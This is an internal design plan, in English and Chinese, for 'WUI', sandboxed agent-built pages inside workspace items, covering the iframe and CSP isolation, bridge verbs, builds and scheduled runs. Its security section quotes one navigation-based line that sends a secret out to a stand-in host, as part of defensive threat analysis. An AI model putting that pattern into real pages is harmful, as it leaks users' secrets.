# Plan — WUI

A **WUI** is a folder in an item's workspace that renders as a live, interactive
page. A domain expert describes what they need, the agent writes the folder, and
the page is usable in the item immediately.

The name is deliberately unfamiliar. Calling it "a web page" tells a domain
person *"that is a software engineer's job"* — the exact association this is
meant to break. WUI is a new word so it gets a new mental slot, and it is
written **WUI** in the UI, as a proper noun.

## Why

Today: the people who understand the domain do not write software, and the people
who write software do not understand the domain. They meet through a URD, and the
delivery date is whatever the engineering schedule allows. Requests that are not
important enough **starve**.

WUI moves that class of work off the engineering schedule. The engineer's output
shifts from *building the application* to *publishing the capability* (a tool) —
they do that once, and N domain experts assemble pages on top of it. If every WUI
still needed an engineer, the bottleneck would only have moved, not gone.

**Success is not "a WUI renders."** It is: one real request that would have
starved, built by someone who does not write software, and still in use a while
later. That is the bar the phases below are scoped against.

## Shape

```
銷售儀表板/                 ← the WUI (a folder, nothing registers it)
  page.ai.yaml            ← `view: wui` — the marker AND the declaration
  index.html              ← the entry
  app.js  style.css       ← inlined at render time
```

Opening `page.ai.yaml` renders the page. It is a `*.ai.yaml` view like
`board.ai.yaml`, so it needs no new file-tree concept, no registry and no
"publish" step — it is simply there, and clicking it runs it.

```
┌─ workspace pane ───────────────────────────────┐
│  [↻ refresh]  [⌖ report]                       │
│ ┌─ iframe: sandbox="allow-scripts", NO         │
│ │  allow-same-origin ⇒ origin is `null`        │
│ │  + injected CSP: default-src 'none'          │
│ │  + injected runtime (ours, always present)   │
│ │                                              │
│ │      the agent's HTML / CSS / JS             │
│ └──────────── postMessage ─────────────────────┤
│                    │  the ONLY way out         │
│  bridge (parent) ──┴─► existing HTTP routes    │
│                    └─► callTool ─► sandbox     │
└────────────────────────────────────────────────┘
```

The browser, not our code, enforces the boundary: a null-origin frame cannot read
cookies, cannot touch the parent DOM, and cannot fetch our API. `postMessage` is
the only channel, so the parent is the gate.

**CSP blocks the network, not inlining.** The page is one self-contained
document, so inline script/style must be allowed or nothing runs. What is taken
away is *reaching out*. This matters more than it first looks: CORS would still
let a request **leave** a null origin (it only withholds the response), so
"cannot read the answer" is not "cannot exfiltrate". `default-src 'none'` with no
`connect-src` of its own is what actually closes it.

**And it is not enough on its own.** CSP has no directive a document can use to
stop ITSELF navigating — `navigate-to` was dropped from CSP3 and never shipped —
so `location.href = "https://x/?d=" + secret` walked past every clause above,
measured in Chromium with fetch, beacon, WebSocket, image, popup, nested frame
and form submission all confirmed refused. The close is `SPA_CSP`'s `frame-src`
on the CONTAINING document (`api/spa.py`), the only actor with a say over a
child frame's navigation. It also removes the second half of the same hole: a
navigated-away frame keeps its `WindowProxy`, so the parent's replies —
necessarily `postMessage(…, "*")`, since an opaque origin cannot be named —
would have been handed to whatever then occupied it.

## Locked decisions

Each of these was argued and settled; the reason is the part worth keeping.

1. **Inside the platform, for signed-in users, inside one item.** Not a public
   URL. Anonymous access would need a second auth story and would point an
   LLM-written page at the open internet.
2. **Only "layer 1": open it from the file tree.** No tab-bar entry, no promotion
   into `profiles/default/`. A WUI lives in the item that made it and does not
   propagate. Copying a folder elsewhere later stays possible precisely because
   nothing registers it.
3. **State lives in workspace files.** Not a private store: what the page writes,
   the agent can read on its next turn, and the human can see in the tree. A page
   with its own invisible storage would kill "ask the AI to change it", which is
   the entire reason to do this here.
4. **Reads the whole item workspace; writes and deletes only its own folder.**
   Read broadly (secondary analysis of the item's real data is a first-class use);
   write narrowly, so a page cannot overwrite `notes.md` or the folder next door.
   A view file at the workspace **root** has no folder of its own, and the honest
   reading of "only its own folder" is then *nothing*: it can read, and every
   write is refused. Treating it as the whole workspace — which is what shipped
   first, with a test pinning it — deleted the invariant for exactly the case a
   hand-written view file reaches.
5. **A folder is a WUI iff it contains a `*.ai.yaml` with `view: wui`.** Inferring
   from "has an `index.html`" would misfire on a downloaded page or an exported
   report. Explicit opt-in, and the yaml is where the declaration lives — so no
   `<meta>` parsing and no second manifest format beside `app.json`.
6. **Capability ceiling is `app.json`, per tool, opt-in.** Enabling a new external
   system is legitimately engineering work; the tool has to exist anyway, so
   naming it in `app.json` costs nothing extra. The bottleneck being broken is
   *building applications*, not *onboarding external systems*.
7. **The bridge has seven verbs and the set is CLOSED.** `listFiles` `readFile`
   `writeFile` `deleteFile` `openFile` `whoami` go to the HTTP routes the FE
   already calls; `callTool` is the one new execution path. **Every future
   capability arrives through `callTool`**, so the bridge never grows and the
   security surface stays a fixed size.
   - `deleteFile` is granted because **write already subsumes destruction** in the
     same scope (overwrite with nothing). Refusing delete removes no risk and
     leaves a page unable to clean up files it created, which only grows quota.
   - **The agent's BUILT-IN tools are not reachable** (`read_file`, `exec`, …).
     Not "first-party", which in this codebase names the bundled `sample-tools`
     packages — those ARE reachable. And not for semantic reasons, which a
     whitelist could fix, but for *type* reasons: `read_file_impl` truncates by
     line and char budget, appends `[truncated: …]` **to the data**, returns
     errors as prose (`"error: file not found: …"`), and decodes with
     `errors="replace"`. Those are correct choices for an LLM and wrong for a
     program: a page reading its own `data.json` gets JSON that fails to parse,
     or worse, parses with half the rows.
   - **One facade, several faces.** A tool is the LLM's face of a capability; an
     HTTP route is the UI's face; `mcp_runner` is the MCP face. A WUI is a
     program, so it takes the program's face.
8. **`callTool` reaches tools that go through the package contract**
   (`PackageInfo`) — today `sample-tools/` plus third-party, tomorrow MCP. Defined
   by contract, never by provenance, so retiring second-party tools changes
   nothing here and leaves no special case behind.
9. **No auto-reload and no push.** Code changes do not reload the page; a refresh
   button rebuilds the iframe. But **`file_changed` IS forwarded into the frame**,
   because that event is already the platform's "someone else edited" cue — a
   page that is an editor and never hears it will silently overwrite other
   people's work. Forwarding is not reloading: the page decides what to do,
   because only it knows about the half-filled form. Conflicts stay
   **last-write-wins**, as everywhere else in the platform.
10. **No babysitting.** No write throttling, no tool-call concurrency limit. A
    wasteful WUI is visible, attributable, and fixable by fixing the WUI. Building
    machinery for an unmeasured problem is inferring a defect from call counts.
    **Guardrails only cover what a user cannot fix by editing their page**: the
    CSP (both of them), the folder write scope, and the capability declaration.
    One bound sits on OUR side of the line and belongs there — the pane keeps at
    most `MAX_REPORTS` reports. That is not policing how well the page runs; an
    unbounded list re-rendered per message freezes the whole workspace, including
    the button that would clear it, so the thing being protected is the app
    around the page, not the page.
11. **The agent learns WUI from a shared skill, not the system prompt.** A skill
    is a folder (`SKILL.md` + `references/` + a complete runnable example) whose
    body loads on demand, so a turn that never mentions WUI pays two lines. The
    example is deliberately an **editor**, the shape that trips on every hazard
    at once (debounce, `file_changed`, folder scope) — copying beats generating
    for small local models.
    - The list of tools this app exposes to `callTool` is **dynamic** and cannot
      live in the skill. The model cannot tell `data-fetch` from `read_file` by
      name, so the host names the WUI-callable set explicitly, appended to the
      skill body at read time (`describe_wui_tools`) off the SAME resolved
      packages and allow-list the turn's toolset was built from. Where a caller
      has no resolved toolset to ask, the section is omitted rather than rendered
      empty: "this app grants none" and "nobody asked" are different claims.
12. **Errors are caught by our injected runtime, never by the agent's code.** A
    blank page is where "the domain expert does it themselves" breaks: they cannot
    open a console, and the agent cannot see the browser. The runtime catches
    `window.onerror`, unhandled rejections and every bridge refusal, shows them in
    the pane in plain language, and offers one button that hands the text to the
    agent. A bridge refusal must therefore read as a sentence, not a `false`.
13. **A pick mode, on the same injected runtime.** The user circles the part that
    looks wrong and it goes to the agent with their comment. Because the parent
    cannot reach into a null-origin frame, this can *only* be done from inside,
    and the only trustworthy code inside is ours. It sends the element's
    `outerHTML`, its `getBoundingClientRect`, and key computed styles — the last
    is what lets a model reason about "it looks squashed" at all. **No screenshot**
    (needs a library the CSP will not let us fetch) and **no source map** (the
    content is JS-generated; the agent wrote the folder and can find it).
14. **WUI knows about files, not entities.** Entities are an App-level concept —
    PM has plenty of special rules and they live inside PM. WUI is general, so
    coupling it to entities would make it "good in apps that have entities". A
    frontmatter helper belongs in the skill's example, or in an App's own skill.
15. **Discovery is deliberately deferred** until the trial. The skill is
    registered in `SHARED_SKILLS` but declared by **no app** — an app opts in
    with one line in its `agent.skills` when it is ready. Declaring it and
    switching it off is a real alternative (a profile can pin a `skills` list, as
    `pm` already does) and was rejected for a different reason than first written
    down: a declared skill puts a row named `wui` in every item's skill picker,
    which is precisely the finding-out being deferred. The cost is that enabling
    it later is an `app.json` line rather than a per-item toggle. No feature flag,
    nothing to remove. Note the asymmetry: the renderer ships to everyone, so a
    hand-written `view: wui` file already works, and `read_skill("wui")` resolves
    in any app. What is gated is whether the *agent* is TOLD, not whether the
    platform can run one.

## Phases

Flat integers, one commit each. Two sequences, because the work landed as two
pull requests — a commit's `P<n>` is a phase of ITS pull request.

- **P1 — render.** `assemble.ts` (pure: inline the folder's relative refs, inject
  the CSP), the `wui` kind reserved and branched ahead of the entity dispatcher
  (the same route `health` takes, because it needs the file path and wants full
  bleed), and the iframe. Outcome: a hand-written folder renders and runs.
- **P2 — bridge, six verbs.** `postMessage` protocol + the parent dispatcher over
  `FileService`, with the folder write/delete scope (and `..` escapes refused).
  Outcome: a page can read the workspace and persist its own state.
- **P3 — runtime.** Injected error capture + pick mode, the pane's refresh /
  report buttons, and handing a report to the agent. Outcome: a broken page is
  reportable by someone who cannot open a console.
- **P4 — `callTool`.** An item-scoped execution route for package tools, gated by
  the yaml declaration ∩ the `app.json` ceiling. Outcome: external integration.
- **P5 — skill.** `sample-skills/wui/` with the editor example and the reference.
  Outcome: the agent can build one from a plain-language request.

`file_changed` forwarding (decision 9) rides with P2, since it is the same
channel and an editor without it is unsafe.

### PR #769 — the first five

The five above.

### PR #773 — pages that have a build

P1–P5 assumed the files in the folder ARE the page. Once a page can be written
with a bundler that stops being true — the folder holds `src/` (edited) and
`dist/` (rendered), and nothing keeps them together. A `src/` edit with no
rebuild leaves the reader looking at the old page with nothing saying why, which
is the only SILENT failure on this path.

A staleness warning was designed and then dropped: telling someone their page
might be out of date is worse than either rebuilding it or leaving it alone.

- **P1 — the build route.** `POST …/wui/build`, streaming the build's own output
  as SSE. `package.json`'s `scripts.build` decides what a build is (a command
  named in the view file would let an LLM-written page choose what a human's
  click executes); the verb is `execute`, the same one a notebook cell needs.
- **P2 — a build that survives a recycle.** `node_modules/` is not mirrored, so
  the build installs first — `--frozen-lockfile` where there is a lock. Without
  this, the first click after a recycle fails and the remedy is "get someone to
  run pnpm install", which is the friction a WUI exists to remove.
- **P3 — the pane.** A **Rebuild** button for pages that have a build, the log on
  screen while it runs, and an **Auto-rebuild** switch — on by default,
  per page and per viewer, turning itself off for a viewer a 403 says may not run
  things here. Rebuilding on open is what closes the gap for everyone who opens
  the page — not a guarantee, since the manifest read may fail quietly and a
  failed build leaves the old `dist/` up; it is a choice because the cost (a
  sandbox waking, tens of seconds) is real.
- **P4 — the claim ledger.** The skill, the react example's README and
  `docs/wui.md` all said the AI rebuilding in the same turn was the only defence.
  It is still worth doing — the automatic build protects the next person to OPEN
  the page, not the one already looking at it — but it is no longer the only one.

The rest of this sequence was not planned. Each phase is something that only
appeared once the thing was USED — pressed in a browser, or looked at in a
screenshot — which is the argument for doing that before calling a feature done.

- **P5 — what the first real Rebuild found.** Four defects, none visible to a
  test: the build ran in the wrong directory (`exec`'s cwd is the workspace
  root, so a workspace-absolute path names the filesystem root); the sandbox had
  no pnpm; the jail's PATH omitted `/usr/local/bin`, where an image installs
  one; and the log printed the build's ANSI colour codes as literal text.
- **P6 — the built example had no stylesheet.** It rendered as browser defaults
  and asked for two class names nothing defined. Caught by someone looking at a
  screenshot and asking whether it had any CSS at all.
- **P7 — opening and building at once showed a broken page.** The build's
  restore races the page's own reads, so `app.js` and `style.css` come back
  missing for a few seconds. The pane waits now. (The race itself is older and
  wider — see "Known and not fixed".)
- **P8 — a real charting library.** "No network" is about runtime: a UMD build
  in the folder is inlined, and the sandbox has a network to fetch it with, so
  `examples/chart/` makes fetching it the page's build step. Hand-drawing an
  SVG was never the answer, and the skill had never said so.
- **P9 — the log folds away when the build succeeds.** It earns the pane while
  it runs and while something is wrong; after that it is a receipt.
- **P10 — the toggle's label.** "on open" was two words nobody could read.

## Known and not fixed

- **Reads route to a sandbox that is not ready yet.** `files/facade.py`'s
  `_warm` probes that a sandbox EXISTS and never asks `is_ready`, so a read
  landing inside a restore window can answer "not there" over an intact durable
  snapshot — for the agent, the file tree and the entity lists, not only a WUI.
  `.ready` was added in #366 for exactly this ambiguity and the mirror honours
  it; reads do not. Wants its own change.
- **`kind: local` cannot run an npm script in a page's folder.** The sandbox
  directory is named after the item, and an item id contains a colon, so
  `<cwd>/node_modules/.bin` cannot be expressed on `PATH`. The hosted sandbox
  mints uuid directories and is unaffected.

## Deliberately not built

- Detecting staleness. Under "rebuild on open" there is nothing to detect, and a
  warning that a page MIGHT be old asks the reader to do the platform's job.
- Auto-reload, live data push, write throttling, tool concurrency limits (10).
- Screenshots and source maps in the pick report (13).
- Entity access from the bridge (14).
- Cross-item access, `exec`, and asking the agent from inside a page — the last
  would arrive as a tool if it ever does (7).
- Any second manifest format, registry, or "publish" action (2, 5).

---

# 上線後的第二輪(2026-09-04)

PR #773 合併後,實際在 prod 用起來才浮出的東西。順序是「回報 → 診斷 → 修」,每一條都註明
是**已修**、**卡在誰身上**,還是**知情不做**。

## PR #788(8 commits,CI 綠,ready,未合併)

| | 回報的話 | 真因 |
|---|---|---|
| P1 | log 伸展高度比 pane 還高,半個版面空白 | `max-height: 30%` 掛在內層,對著一個被無上限內容撐大的容器算百分比。真瀏覽器量:舊結構 strip 1592px、頁面 **0px** |
| P2 | 「IRequestEnv 沒有注入」 | 兩條 WUI 路由都沒接。`callTool` 已接;**`build` 刻意不接**(見下) |
| P3 | 「AI 好像沒有被推薦使用 react and ts」 | skill 寫「Prefer no build」,把所有頁面導向 vanilla JS。已改為預設 React+TS,附 `wui.d.ts` |
| P4 | 「skill 不夠仔細,應該讓 AI 檢查 tool 的 output」 | `callTool` 的輸出格式是 tool 的契約,平台不保證。已加「先跑一次再寫解析」 |
| P5·P6 | 「13mb 單行 json 過不了 readFile 橋」→ 實際症狀「一直說沒有查到東西」 | **不是大小問題**(13.6MB 實測 232ms 通過)。真因:bare 路徑會把頁面資料夾疊兩次,而那個失敗被當成「第一次開頁」靜音 |
| P7·P8 | 兩輪對抗式 review | 兩輪最嚴重的發現**都是前一輪修法造成的**——見下面的教訓 |

### 這輪最貴的兩個教訓

1. **修了整類,卻沒打到回報的那個實例。** P5 修好「頁面資料夾**以外**的缺檔」,但使用者
   看到的 `/x/x/foo.json` 疊加路徑**還在資料夾裡面**,所以照樣靜音。commit 宣稱結案,
   症狀原封不動。**修完要把使用者貼的那個字串原樣跑一次。**
2. **規則搬家沒把測試帶走。** 判準從 `resolveWritePath` 搬到新的 `isOwnFile`,舊函式的
   測試留在原地繼續綠,新函式守衛是零——三個突變通過了全部 196 條測試。

### 一個被 review 擋下來的安全問題

`IRequestEnv` **不可以進 build**。`dist/` 會落到永久儲存並被組進每一位看這個 item 的人拿到
的文件,而 bundler 的工作就是把環境變數烤進產出物(Vite 的 `loadEnv` 會撈 `VITE_` 開頭的
名字)。per-request 憑證進到那裡 = 一個人的憑證寫進別人下載得到的檔案。

**判準:這條路徑的產出是回給問的那個人,還是變成共享的東西?** 前者注入,後者不注入。

## prod 回報的第二批(進行中,未 commit)

1. ✅ **install 和 build 分開報。** 兩步一個 `&&`、一個結論,失敗在哪一半看不出來;而
   `node_modules` 也答不了(沒有依賴的頁面裝完只剩一個中繼檔,跟裝到一半死掉長一樣)。
   已在兩步之間印 `BUILD_STEP_MARK`,用 `&&` 串,所以**它沒出現就代表 install 是失敗的那半**。
2. ✅ **下載來的函式庫是 build 產物,不可以改。** `chart.umd.js` 躺在資料夾裡跟原始碼長得
   一樣,AI 去改它,下次 Rebuild 直接覆蓋,改動無聲消失。已在 SKILL.md 與 chart 的 README
   明寫。⚠️ 這個陷阱**只存在於不用打包器的流程**;用 Vite 的話函式庫是正常依賴、被編譯進
   `dist/`,沒有散落的副本可以被誤認。
3. ✅ **「任何 npm 套件都能這樣抓」。** skill 只示範 chart.js,AI 就以為能用的只有那一個。
4. ✅ **chart 範例的圖表生命週期缺陷。** 資料變空時 `draw()` 提早 return **沒有 destroy**
   舊圖表,Chart.js 仍在監看 canvas 母節點,版面一動就讀到不存在的 `parentNode`。
   這很可能就是 prod 回報的那個錯誤,而 AI 會把它說成「chart.js 本身的問題」。
5. 🔨 **一個演示完整功能的範例**(`examples/complete/`)。一頁用過整個介面:讀 item 真實
   檔案、真的圖表庫、寫自己的資料、`callTool`(**含 tool 回傳路徑那個實際踩到的案例**)、
   `openFile`、`whoami`、`onFileChanged`、每種失敗都是一句話。React + TS + Vite。
   **還缺**:`styles.css`、`README.md`、實際 build 驗證、釘住用的測試、加進範例表與本文件。

## 已定案、還沒做:給頁面一個自己的網址

決定在 2026-09-04 拍板,完整內容(含自動 rebuild 那個後果)寫在下面第三輪的
「Deploy(第一個願望)」一節,這裡不重述——同一件事寫兩處,保證其中一處會變假。

## 第二輪知情不做

- `listFiles` 對不存在的前綴回空陣列,靜音。平台分不出「空資料夾」和「沒這個資料夾」
  (`walk` 只回檔案),所以沒有依據拒絕。
- item 的 `env_vars` 會蓋過後端自己設的 `PATH`/`HOME`/`NODE_ENV`(`Sandbox.exec` 的契約
  就是使用者的值贏),所以 item 上設 `NODE_ENV=production` 會讓 pnpm 跳過 devDependencies、
  `tsc` 消失、Rebuild 全壞。要不要擋保留字是平台層級政策,不塞在 WUI 的 PR 裡。
- **知識庫那組 tool(9 個)頁面碰不到**,沒被考慮過,是最有機會被要求的一組。設計上的規矩
  是:新能力一律以 **package tool** 的形式出現,不加新的 bridge 動詞——要信任的程式碼面積
  才不會長大。所以正確形狀是一個 `ask_kb` 的 package tool,不是 `workspace.askKnowledgeBase()`。

---

# 第三輪:讓頁面能引發工作(2026-09-05 grill 定案)

四個願望——**deploy 成網址**、**頁面能叫 agent 判斷**、**頁面能叫 workflow 判斷**、**cronjob**
——grill 完之後收斂成**一個**設計。這一節記的是**決定和理由**;理由比結論重要,因為有五個
結論是我提錯、被推翻之後才對的。

## 一句話

> **頁面寫下「以我的身分,在某個時候,做某件事」;平台在那個時候把它跑起來。**

平台的詞彙只有四個:**什麼時候**(時間或事件)、**跑哪個 workflow**、**帶什麼 payload**、
**以誰的身分**。它不認識訂閱、報表、到貨——那些是應用,活在 WUI 裡。

## 最重要的一條:宣告是資料,狀態是平台的

| | 工程師的(現況) | 使用者的(要做的) |
|---|---|---|
| **宣告** | profile 的 `triggers.json` | 頁面自己資料夾裡的 `schedules.json` |
| **狀態** | `_TriggerWindow`(specstar,CAS) | **同一個,原封不動** |

這個切法一次解掉四件事:

- **不需要新的 bridge 動詞** — 頁面用 `writeFile` 就好,`protocol.ts` 那條「介面永遠不再長新
  動詞」不用破
- **不需要新的 tool** — 沒有東西要呼叫
- **重複變成結構上不可能** — `writeFile` 是整檔取代,不是 append。連按五次儲存 = 一份排程
- **租約、補跑、接手完全沿用** — 它們只認 `trigger_id`,不在乎宣告從檔案還是資料列來

⚠️ **`trigger_id` 必須由平台從內容導出**(跑什麼 + 帶什麼 + 什麼時候),不接受頁面指定。
否則頁面每次存檔重生一個亂數 id,今天跑過的鎖叫 `abc+09-05`、存檔後變 `xyz+09-05`,**同一天
再跑一次、信再寄一封**。LLM 寫的頁面很容易這樣寫。手法照抄 `send_notification` 的
`{recipient}:{topic}:{window}`——內容導出的鍵,平台已經在用。

## 一個引擎,兩個入口

「早上 9 點自動跑的報表」和「使用者按下『幫我判斷』」**底下是同一種東西:一次 run**。差別只有
**有沒有人正在看**。

兩個入口:**現在按下去** / **時間到**。

⚠️ 原本設計了第三個(**事件到**),2026-09-05 決定**先不做**——見下面「事件:延後,不是否決」。
兩個例子都不因此失效:到貨通知改成每分鐘輪詢,延遲從幾秒變成約一分鐘,其餘不變。

同一種帶來的(全部是既有的,不用蓋):使用者等不耐煩關掉視窗 → 工作**繼續跑完**;想中途停 →
有停止鈕;月底查花費 → 每次都有紀錄;進度 → 平台本來就在產生。

## sweeper 迴圈(具體長什麼樣)

**誰**:API 行程裡一個背景 async 迴圈,跟鏡像同步、閒置回收同一類。不是另一個服務,不是 k8s
cronjob。

**多久**:固定間隔(60 秒)。這個數字就是「最晚會遲到多久」。

**做什麼**:讀索引表 → 哪些 item 有排程檔 → 讀那個檔 → 對每一列問「**這一輪的時間過了沒?
過了的話這一輪跑過了沒?**」

**怎麼驅動**:搶「這一列 + 這一輪」那把鎖(CAS)→ 搶到才開 run,帶 payload、用建立者的身分 →
把結果記在那一列的狀態上。

這個判準順便解決補跑:sweeper 在 09:00 掛掉、10:30 才活,它會發現「今天 09:00 過了、今天還沒
跑」→ **補跑**,而不是像傳統 cron 那樣錯過那一秒就永遠沒了。

⚠️ **索引表是必要的。** 現在 sweeper 掃的是 app × profile(小的靜態集合);讀 item 層級的宣告
就變成掃所有 item,而 item 會一直長。頁面存 `schedules.json` 時,平台在 `writeFile` 路徑上認得
這個檔名、往一張小表寫一列「這個 item 有排程」。手法跟 `_SandboxActivity` / `_SandboxAddress`
一樣。表上有但檔案沒了 → 那一輪把該列刪掉,自我修復。

## 逐題決定

| # | 決定 | 理由 |
|---|---|---|
| 資料範圍 | 同一個 item 上大家看到的一樣 | item 已經是權限邊界;誰收信是欄位,不是權限問題 |
| 可見性 | 全 item 看得到所有排程,任何人可取消 | 否則會有沒人管得動的幽靈工作(離職的人排的每天打 DB) |
| 身分失效 | 建立者不能在此 item 行動 → **停下來並顯示原因**,任何人可接手 | 繼續跑=權限外洩且沒人會發現;安靜停=報表有一天不來了、幾週後才有人問 |
| 顆粒度 | **不設地板**,最細就是 sweeper 間隔 | 原本定半小時是怕「很多列 × 很細」,但 poller 天生只有一列,而且護欄已經擋總量。**兩套機制管同一件事,保證其中一套變假** |
| 連續失敗 | N 次(3~5)後**自動停並說明** | 永遠試 = 第 30 天那個人已經不看那些信了,而通道一旦被訓練成噪音,真正要緊的那封也不會被讀 |
| 逾時 | **10 分鐘**,訊息要**寫出那個數字**(「已超過 10 分鐘,已停掉」) | 永遠轉是唯一連使用者都描述不出來的壞法。含糊的「太久」讓人以為是隨機,寫出數字才知道那是設定 |
| 併發上限 | **不加**。既有的 `SandboxQuotaExceeded` 就是界線 | 每個 run 都要沙盒。既有那個數字**每個部署已校準**、債務人已經是 owner、訊息已經可行動(「關掉哪個換回多少」)。新加一個會**先觸發並蓋掉它** |
| 排程列數 | **1000,寫在 config**,附 migrations 帳 + 一條證明旋鈕真的被讀到的測試 | 這是**失控護欄不是政策限制**:正常永遠碰不到,撞到就代表頁面有 bug。沒有數據時護欄比政策誠實 |

## 被推翻的五個(理由比結論重要)

1. **事件要帶完整 payload。** 我原本說「只帶最小線索,強迫重新查」以避免耦合。錯:那剝奪了
   workflow「選擇相信事件」的餘地。**完整 payload,workflow 自己決定信不信。** 選擇相信的就跟
   實體格式綁在一起——那個耦合是**自願的、而且看得出來是誰自願的**,可以接受。
2. **頁面拿完整事件流,自己決定怎麼畫。** 我原本說平台畫細節、頁面只拿粗狀態。錯:WUI 的整個
   前提就是頁面作者決定體驗,而平台的外框不知道使用者按的是哪一列。⚠️ **skill 要附一個「接水」
   範例,而且那個 reducer 必須「不認得的事件就忽略」**——範例是被複製進頁面的、不會自己更新,
   所以只有忽略未知才能讓「新增事件」保持非破壞性。
3. **同步和排程是同一種東西。** 我原本分兩條路,假設同步是「三秒、純判斷」。使用者選了「agent
   能讀檔案能用工具」之後那個假設就沒了——能跑三分鐘又有副作用的東西**就是一次 run**。
4. **帳要記在 item owner 身上。** 我原本說「拿不到個人 token 就退回端點的 key,不會壞掉」。
   「不會壞掉」正是錯的判準:**它會安靜地花系統的額度**,第三方寫壞就是所有人一起死。
   (後續:LLM 花費由 LiteLLM 計量、額度不足送 429,平台已有處理,所以這條不用自己蓋帳本。)
5. **上限寫 config 不寫死。**

## 兩條憑證線,平台不需要知道什麼是 service account

| 打什麼 | 從哪來 | 有人按 | 排程跑 |
|---|---|---|---|
| **你們的 DB / 工具** | item 的 `env_vars`(service account token,不過期) | ✅ | ✅ |
| | `IRequestEnv`(個人 token,會過期) | ✅ | ❌ 沒有 cookie |
| **LLM** | `ITokenService`,背景用 `acting_user` | ✅ | ⚠️ 換不到個人 token → 用端點自己的 key |

**「個人 token 在不在」本身就是「有沒有人在」的訊號**,工具或 WUI 自己判斷用哪一個。平台從頭到
尾不需要學會 service account 這個詞——**平台給一般化的機制,應用決定政策。**

⚠️ **要寫進 skill:AI 不能假設個人 token 一定在。** 排程跑的時候它就是不在,而一個寫成「一定用
個人 token」的頁面,互動時好好的、排到半夜就掛——「測的時候都對、上線才錯」的典型。

⚠️ **自動跑的走背景 lane,遇到 429 不等、直接失敗。** `failover/model.py` 的等待上限是時間不是
次數(操作者連無限等待都能接受),因為那條路上**有人在等**。排程沒有人在等,而且**有下一個
視窗**;它卡著等的時候佔的是那個 item 的沙盒容量,**擠掉的正是唯一真的有人在等的那條路**。
`ITokenService` 的 `lane` 參數文件明寫「說的是有沒有人在等這個答案」——概念已經在,不用發明。

## 通知:接縫,不是平台自己長 email

`send_notification` **已經存在**,而且防重送指紋 `{recipient}:{topic}[:window]` 就是為排程
fan-out 造的(同一天的報表不管重跑幾次都只寄一封)。**但它只寫站內信,沒有出站通道。**

缺的是 `INotificationChannel`,照既有 12 個 `I<Name>` 接縫的形狀:平台**永遠**先寫站內那一列,
有指名通道才**再**交給它;平台不出貨實作(企業的 email 是你們的 relay、寄件網域、合規)。
沒指名的部署行為跟今天一模一樣。

⚠️ **送信失敗不算排程失敗。** 站內那一列是事實紀錄,通道是盡力而為。否則一次兩小時的郵件故障會
觸發連續失敗停用,把郵件問題升級成「全公司排程集體自我關閉」。

## 到貨這種需求怎麼落地

事件延後之後,**只有輪詢這一條**:每分鐘問一次「從上次到現在有什麼新的」,有就寄。

⚠️ **fan-out 要放在 workflow 裡,不是排成很多列。**

- 放錯:50 個人各一列「我的貨到了沒」= 50 次查詢/分鐘 = **每天 72,000 次**
- 放對:**一列** poller 問「從上次到現在有什麼新的」,再自己分給 50 個人 = **每天 1,440 次**,
  **跟訂閱人數無關**

「從上次到現在」的水位線是那個 workflow 自己的狀態,寫進 workspace 裡它自己的檔案(不是頁面寫
的檔案——那是使用者的意圖,水位線是執行的痕跡)。⚠️ 它一定會漏:查完、信寄了、寫水位線前掛掉
→ 下一輪重查 → 重複寄。**主題用到貨單號**的話,`send_notification` 的帳本剛好補上那個洞。

⚠️ **帳本的主題必須是「到貨本身的識別碼」,不是 run 的 id。** 用 run id 擋不住任何事,因為每次
重跑都是一個新的 run。這條在只有輪詢的時候就已經需要(水位線沒寫成功就會重查),而事件哪天回來
之後更需要——同一批到貨被兩條路各看到一次,只有用到貨單號當主題才擋得住。

## 事件:延後,不是否決

2026-09-05 決定先不做「事件到」這個入口。**理由是複雜度,不是它沒用。**

當時查到的事實,留給之後重啟的人:

- **平台現在唯一的事件來源是 entity 的寫入**(`EntityStore` 提交後送出 `EntityWriteEvent`,
  `workflow.event_dispatch` 接)。它帶整筆 `fields`,而且 `origin` + 深度上限已經擋掉自我觸發
  與間接循環。
- ⚠️ **但那個事件是 post-commit、in-request、在寫入的那台 pod 上送的。** 那台 pod 在提交完成和
  送出事件之間死掉,**事件就沒了,沒有補送**。
- **外部系統目前沒有入口。** `external_refs`(#700)是「這個 item 吃過這筆記錄了嗎」的去重欄位,
  不是事件匯流排。

如果之後接一個 event bus service,設計結論是:

1. **平台去訂閱,不是 bus 打進來。** 否則 bus 也要知道「誰關心什麼」,於是宣告有兩份會漂移——
   而漂移的症狀(幽靈通知 / 漏通知)極難查。訂閱制讓宣告只留在頁面那個檔案裡。
2. **接口照抄 `EntityWriteSink` 的形狀**:`IEventBus.subscribe(sink)`,impl 自己跑消費迴圈。
   平台不需要知道底下是 Kafka、NATS 還是長輪詢。
3. ⚠️ **對 bus 的硬性要求:同一件事重送時 `event_id` 必須一樣。** 因為 bus 幾乎都是
   at-least-once,而且多台 pod 會各收一份。平台的去重是既有那把 CAS 鎖,只要把鑰匙從
   `(trigger_id, fire_window)` 換成 `(trigger_id, event_id)` 就成立——**但前提是 id 穩定**。
   **這件事必須在 bus 被設計的時候就講,事後補來不及。**
4. **訂閱範圍**傾向「部署層級寫死的粗範圍 + 平台內部過濾」,而不是「只訂宣告裡出現過的 topic」
   ——後者又生出一份會漂移的狀態,而漏訂的症狀是「有些事件永遠收不到」。這一條沒定案。

⚠️ **無論如何,事件是加速不是保證。** bus 會停機、topic 會改名、訂閱會掉線,而輪詢的判準是
「從水位線之後有什麼新的」——它不在乎中間漏了幾個通知。所以事件回來之後,**輪詢那條要留著**。

## Deploy(第一個願望)

**決定:打開網址的人必須本來就看得到那個 item。** 所以是小功能——同一個 app 上一條「沒有外殼」
的路由(`/w/{item}/{資料夾}`),整個視窗就是那一頁。沿用同一個登入、同一組權限檢查、同一個
組裝器、同一個 sandbox + CSP + `frame-src` 信封。**不需要新伺服器、不需要匯出、不需要第二套
安全模型。**

⚠️ 那條路由上**也要有自動 rebuild**,否則從網址進去的人看到的是舊的 `dist/`。

⚠️ 網址不多給也不少給權限。要發給看不到 item 的人是**另一個層級**的設計(頁面要有比 item 更窄
的身分和資料範圍),不在這個決定裡。

## 沿用 vs 新建

**沿用(不動):** `_TriggerWindow` 的租約/補跑/接手、`ScheduleTrigger`/`EventTrigger` 的 tagged
union 形狀、`acting_user` 必填、workflow run 的紀錄與取消、`SandboxQuotaExceeded`、
`ITokenService` 與它的 `lane`、`IEnvProvider` → item `env_vars`、`send_notification` 的防重送帳
本、`handle.py` 的 `step_timeout_s`、`tools:` 的宣告+天花板形狀(第三次沿用:tools / workflows /
agents 都同一套)。

